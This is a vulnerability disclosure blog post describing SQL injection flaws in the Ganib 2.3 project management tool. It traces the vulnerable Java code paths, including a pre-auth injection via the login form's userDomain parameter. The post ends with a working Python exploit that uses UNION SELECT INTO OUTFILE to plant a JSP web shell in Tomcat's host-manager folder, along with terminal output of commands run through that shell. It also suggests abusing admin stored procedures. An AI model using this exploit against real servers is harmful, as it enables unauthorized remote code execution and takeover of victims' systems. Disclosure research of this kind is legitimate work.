---
categories:
- sqli
- ganib
- vulnerability
comments: false
date: "2014-02-24T22:03:07Z"
title: ganib project management 2.3 SQLi
---

[Ganib](http://www.ganib.com/) is a project management tool supporting all the glorious project management utilities.  The latest version, 2.3 and below, is vulnerable to multiple SQL injection vectors.

The first SQL injection vector is a post-auth UPDATE injection in changetheme.jsp:

```
String theme = request.getParameter("theme");
User user = (User) pageContext.getAttribute("user", PageContext.SESSION_SCOPE);
if( user != null && user.getID() != null ) {
    DBBean db = new DBBean();
    
    try {
        String query = "UPDATE PN_PERSON SET THEME_ID = '" + theme + "' WHERE PERSON_ID = " + user.getID();
        db.prepareStatement(query);
        db.executePrepared();
    } finally {
        db.release();
    }
```

It's obvious where the flaw is.

The most serious of the vectors is a preauth SQL injection vulnerability in the login POST request.  The issue with this is that user-controlled data is passed through a series of data objects, all of which fail to sanitize the data, but all of which assume the data is cleansed.

The initial POST request is sent to `LoginProcess.jsp`.  This builds the LogManager object, which instantiates the object with our provided username, password, and user domain; all unsanitized:

```
// Grab parameters from Login form
String secure = request.getParameter ("secure");
String username = request.getParameter ("J_USERNAME");
username = username == null ? u_name : username;
String password = request.getParameter ("J_PASSWORD");
password = password == null ? pwd : password;
String userDomain = request.getParameter("userDomain");

[...]

else 
    loginManager.createLoginContext(username, password, userDomain);
```

And the request, for reference:

```
POST /LoginProcessing.jsp HTTP/1.1
Host: 192.168.1.219:8080
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.219:8080/
Cookie: JSESSIONID=747813A1BB393D97FD577E2010F25F37; g.s=CE7D2D0E1293623B73B56FC239BFA23D; g.r=1; _sid=; _styp=; JSPRootURL=; cookies=true
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 109

theAction=submit&J_USERNAME=bob%40bob.com&J_PASSWORD=password&language=en&remember_checkbox=on&userDomain=1000
```

Once the loginManager is instantiated, `loginManager.completeLogin` is called.  This instantiates the `DomainAuthenticator` object and attempts to login:

```
try
{
    domainAuthenticator = DomainAuthenticator.getInstance(this.loginContext.getDomainID(), this.loginContext.getUsername(), this.loginContext.getClearTextPassword());
    domainAuthenticator.authenticate(shadowLogin, isFromSSOLogin);
    statusCode = LoginStatusCode.SUCCESS;
}
```

The `DomainAuthenticator` object manages authentication with the various supported methods; domain, SSO, etc.  If you're still following with me, the traversal path thus far can be visualized below:

{{< figure class="center" src="http://2.bp.blogspot.com/-ohiBWXtvQso/Uu6nxy-RQ-I/AAAAAAAAAzQ/9vL6HGqG4Ks/s1600/flow.jpg" >}}

Note that, so far, none of the provided input has yet to be sanitized.

The `DomainAuthenticator` constructor first instantiates a `UserDomain` object:

```
private DomainAuthenticator(String domainID, String username, String clearTextPassword)
  throws DomainException
{
  try
  {
    UserDomain domain = new UserDomain();
    domain.setID(domainID);
    domain.load();
    setDomain(domain);

    setAuthenticationContext(new AuthenticationContext(domainID, username, clearTextPassword));
  }
```

Once the `UserDomain` object is initialized, the `domainID` is set by our unsanitized `userDomain` parameter, and the load function is invoked.  The `load` function is as follows:

```
 public void load()
    throws PersistenceException
  {
    DBBean db = new DBBean();
    try
    {
      load(db);
    } finally {
      db.release();
    }
  }

  public void load(DBBean db)
    throws PersistenceException
  {
    loadProperties(db);

    loadUsers(db);

    loadSupportedConfigurations(db);
  }
```

A `DBBean` object is created, and passed into an overloaded `load` function.  This runs three other functions to build the `DBBean` object; the call we're interested in is `loadUsers`:

```
 public void loadUsers(DBBean db)
    throws PersistenceException
  {
    if (this.domainID == null) {
      throw new PersistenceException("UserDomain.loadUsers() can not proceed because the domainID is null");
    }

    if (this.userCollection == null) {
      this.userCollection = new DomainUserCollection();
    }

    this.userCollection.setDomainID(getID());
    this.userCollection.load(db);
  }
```

This call invokes yet another object, `DomainUserCollection`.  Once instantiated, our yet to be sanitized `userDomain` parameter is set in the object, and the `load` function is invoked.  This function, finally, takes us to our vulnerable SQL query:

```
 protected void load(DBBean dbean)
    throws PersistenceException
  {
    String qstrLoadUsersForDomain = "SELECT U.USER_ID, U.USERNAME, U.DISPLAY_NAME,U.USER_STATUS FROM PN_USER_VIEW U WHERE DOMAIN_ID = " + getDomainID();

    if (this.domainID == null) {
      throw new PersistenceException("DomainUserCollection.load() was unable to load the users for this domain because of an invalid (null) domainID");
    }

  [...]

  dbean.executeQuery(qstrLoadUsersForDomain);
```

Here we can see that our controlled `userDomain` parameter is injected directly into the SQL query.  This can be exploited using a UNION SELECT with four columns to write a JSP shell out.

Because of the way the Tomcat applicaton's web.xml is configured, we cannot drop a JSP into the ROOT folder and expect it to run.  Have no fear, as the default Tomcat install built into Ganib includes both /manager and /host-manager, which provide perfect receptacles for our dumped shell:

```
root@jali:~/exploits# python ganib_sqli.py -i 192.168.1.64 -p /var/www/ganib/tomcat/webapps/host-manager -j ./cmd.jsp
[!] Dropping ./cmd.jsp on 192.168.1.64...
[!] Dropped at /wjdll.jsp
root@jali:~/exploits# python -c 'import requests; print requests.get("http://192.168.1.64:8080/host-manager/wjdll.jsp?cmd=pwd").content'

/var/www/ganib/tomcat/bin

    1    2    3

root@jali:~/exploits# 
```

There will be some issues if Ganib is running in a directory that MySQL does not have permissions to write to, and considering this is a completely portable install, it could be running from anywhere.  Of course, you can also make use of the dozens of stored procedures Ganib installs by default; such as APPLY_ADMIN_PERMISSIONS, REMOVEUSER, or CREATE_PARENT_ADMIN_ROLE; this would simply turn the query from a UNION SELECT into OR PROCEDURE().

I did a quick grep through the remainder of the code base and found multiple other injection vectors; most, however, were postauth. 

```
# Exploit title: Ganib 2.0 SQLi
# Date: 02/02/2014
# Exploit author: drone (@dronesec)
# More information:
# Vendor homepage: http://www.ganib.com/
# Software link: http://downloads.sourceforge.net/project/ganib/Ganib-2.0/Ganib-2.0_with_jre.zip
# Version: <= 2.3
# Fixed in: 2.4
# Tested on: Ubuntu 12.04 (apparmor disabled) / WinXP SP3

from argparse import ArgumentParser
import sys
import string
import random
import requests

""" Ganib 2.0 preauth SQLi PoC
    @dronesec
"""

def loadJSP(options):
    data = ''

    try:
        with open(options.jsp) as f:
            for line in f.readlines():
                data += line.replace("\"", "\\\"").replace('\n', '')
    except Exception, e:
        print e
        sys.exit(1)

    return data

def run(options):
    print '[!] Dropping %s on %s...' % (options.jsp, options.ip)

    url = "http://{0}:8080/LoginProcessing.jsp".format(options.ip)
    shell = ''.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))

    exploit = '1 UNION SELECT "{0}","1","2","3" INTO OUTFILE "{1}"'
    exploit = exploit.format(loadJSP(options), options.path + '/%s.jsp' % shell)

    data = { "theAction" : "submit",
             "J_USERNAME" : "test",
             "J_PASSWORD" : "test",
             "language" : "en",
             "remember_checkbox" : "on",
             "userDomain" : exploit
           }

    res = requests.post(url, data=data)
    if res.status_code is 200:
        print '[!] Dropped at /{0}.jsp'.format(shell)
    else:
        print '[!] Failed to drop JSP (HTTP {0})'.format(res.status_code)


def parse():
    parser = ArgumentParser()
    parser.add_argument("-i", help='Server ip address', action='store', dest='ip',
                        required=True)
    parser.add_argument("-p", help='Writable web path (/var/www/ganib)', dest='path',
                        action='store', default='/var/www/ganib')
    parser.add_argument("-j", help="JSP to deploy", dest='jsp', action='store')

    options = parser.parse_args()
    options.path = options.path if options.path[-1] != '/' else options.path[:-1]
    return options

if __name__ == "__main__":
    run(parse())
```
